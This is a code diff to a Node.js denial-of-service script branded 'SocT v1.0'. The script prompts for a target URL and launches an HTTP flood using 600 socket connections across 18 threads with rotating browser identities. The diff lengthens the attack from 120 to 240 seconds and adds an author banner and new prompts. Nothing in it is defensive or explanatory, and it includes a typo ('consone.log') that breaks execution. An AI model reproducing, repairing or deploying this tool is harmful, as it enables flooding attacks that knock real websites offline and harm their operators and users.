@@ -9,12 +9,14 @@ const rl = readline.createInterface({
     output: process.stdout
 });
 
-rl.question('Enter the target URL: ', (url) => {
+console.log("[?] put (https://) or (http://) first.");
+consone.log("");
+rl.question('.!URL > ', (url) => {
     const targetUrl = url;
     const socketConnections = 600;
     const threads = 18;
-    const attackDurationSeconds = 120;
-
+    const attackDurationSeconds = 240;
+    
     const browsers = [
         'Chrome',
         'Firefox',
@@ -44,6 +46,8 @@ rl.question('Enter the target URL: ', (url) => {
     }
 
     function attack(protocol) {
+        console.log("SocT v1.0 By vzexg-2/Sunshine <sunshinexjuhari@protonmail.com>");
+        console.log("");
         const transport = protocol === 'https' ? https : http;
         const startTime = Date.now();
         const endTime = startTime + (attackDurationSeconds * 1000);
@@ -79,7 +83,7 @@ rl.question('Enter the target URL: ', (url) => {
                 }
             } else {
                 clearInterval(timerId);
-                console.log("Attack finished. Time limit reached.");
+                console.log("Attack finished. Time reached limit, You can edit the timer by editing this file.");
                 rl.close();
             }
         }, 100);
